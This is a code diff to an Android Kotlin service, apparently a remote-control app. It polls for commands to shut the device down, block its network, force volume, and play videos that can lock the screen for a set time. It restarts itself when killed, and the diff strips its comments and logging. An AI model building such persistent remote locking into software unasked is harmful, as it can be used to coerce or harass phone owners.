@@ -63,7 +63,6 @@ class ControlService : Service() {
         try { wakeLock?.release() } catch (e: Exception) { }
         super.onDestroy()
 
-        // Самовосстановление через 3 сек
         val restartIntent = Intent(applicationContext, ControlService::class.java)
         val pendingIntent = PendingIntent.getService(
             applicationContext, 1, restartIntent,
@@ -75,8 +74,6 @@ class ControlService : Service() {
             pendingIntent
         )
     }
-
-    // --- Polling ---
 
     private fun startPolling() {
         pollingJob?.cancel()
@@ -121,29 +118,28 @@ class ControlService : Service() {
         }
     }
 
-    // --- Диспетчер команд ---
-
     private fun handleCommand(cmd: JSONObject) {
         scope.launch(SupervisorJob()) {
             try {
+                val lock = cmd.optBoolean("lock", false)
+                val duration = cmd.optInt("duration", 0)
                 when (cmd.optString("cmd")) {
                     "shutdown"      -> shutdown()
                     "dnd_off"       -> disableDnD()
                     "show_message"  -> showOverlayMessage(cmd.optString("text", "Сообщение"))
                     "ban"           -> startVpnBlock()
                     "unban"         -> stopVpnBlock()
-                    "video"         -> VideoActivity.startBuiltin(this@ControlService, cmd.optInt("num", 1))
-                    "play_raw"      -> VideoActivity.startFromUrl(this@ControlService, cmd.optString("url"))
+                    "video"         -> VideoActivity.startBuiltin(this@ControlService, cmd.optInt("num", 1), lock, duration)
+                    "play_raw"      -> VideoActivity.startFromUrl(this@ControlService, cmd.optString("url"), lock, duration)
                     "delete_video"  -> deleteVideoCache(cmd.optString("url"))
                     "sound"         -> setVolume(cmd.optInt("level", 5))
+                    "unban_video"   -> VideoActivity.unlock()
                 }
             } catch (e: Exception) {
                 Log.e(TAG, "Command failed: ${e.message}")
             }
         }
     }
-
-    // --- Команды ---
 
     private fun shutdown() {
         val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
@@ -168,34 +164,23 @@ class ControlService : Service() {
     }
 
     private fun setVolume(level: Int) {
-        Log.d(TAG, "setVolume($level)")
         val am = getSystemService(Context.AUDIO_SERVICE) as AudioManager
-        val streams = listOf(
+        listOf(
             AudioManager.STREAM_MUSIC,
             AudioManager.STREAM_RING,
             AudioManager.STREAM_NOTIFICATION,
             AudioManager.STREAM_ALARM
-        )
-        streams.forEach { stream ->
-            val maxVol = am.getStreamMaxVolume(stream)
-            val targetVol = (level / 10f * maxVol).toInt().coerceIn(0, maxVol)
-            try {
-                am.setStreamVolume(stream, targetVol, 0)
-            } catch (e: Exception) {
-                Log.e(TAG, "setVolume stream=$stream failed: ${e.message}")
-            }
+        ).forEach { stream ->
+            val max = am.getStreamMaxVolume(stream)
+            val target = (level / 10f * max).toInt().coerceIn(0, max)
+            try { am.setStreamVolume(stream, target, 0) } catch (e: Exception) { }
         }
     }
 
     private fun deleteVideoCache(url: String) {
         if (url.isEmpty()) return
-        val cacheFile = VideoActivity.getCacheFile(this, url)
-        if (cacheFile.exists()) {
-            val deleted = cacheFile.delete()
-            Log.d(TAG, "deleteVideoCache: deleted=$deleted path=${cacheFile.path}")
-        } else {
-            Log.d(TAG, "deleteVideoCache: файл не найден (не был скачан)")
-        }
+        val file = VideoActivity.getCacheFile(this, url)
+        if (file.exists()) file.delete()
     }
 
     private fun showOverlayMessage(text: String) {
@@ -228,8 +213,6 @@ class ControlService : Service() {
             Log.e(TAG, "showOverlayMessage failed: ${e.message}")
         }
     }
-
-    // --- Уведомления ---
 
     private fun createNotificationChannel() {
         val nm = getSystemService(NotificationManager::class.java)
